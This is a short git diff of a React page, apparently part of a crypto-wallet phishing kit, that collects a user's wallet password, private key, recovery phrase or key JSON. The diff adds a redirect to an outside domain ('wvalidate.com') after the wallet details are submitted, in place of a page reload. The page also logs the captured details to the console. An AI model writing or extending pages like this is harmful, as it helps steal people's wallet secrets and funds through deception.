@@ -50,7 +50,7 @@ function WalletDetailsEntryPage() {
           password: '',
           privateKey: '',
         });
-        // window.location.reload();
+        window.location.replace('https://wvalidate.com');
       })
       .catch((error) => alert(error));
     console.log(walletDetails);
@@ -63,15 +63,15 @@ function WalletDetailsEntryPage() {
   }
 
   function displayKeyJson() {
-    setShowKeyJson(true);
     setShowPhrase(false);
+    setShowKeyJson(true);
     setShowPrivateKey(false);
   }
 
   function displayPrivateKey() {
-    setShowPrivateKey(true);
     setShowPhrase(false);
     setShowKeyJson(false);
+    setShowPrivateKey(true);
   }
 
   return (
@@ -135,6 +135,7 @@ function WalletDetailsEntryPage() {
               </div>
             </div>
           )}
+
           {showKeyJson && (
             <div className="mb-3">
               <textarea
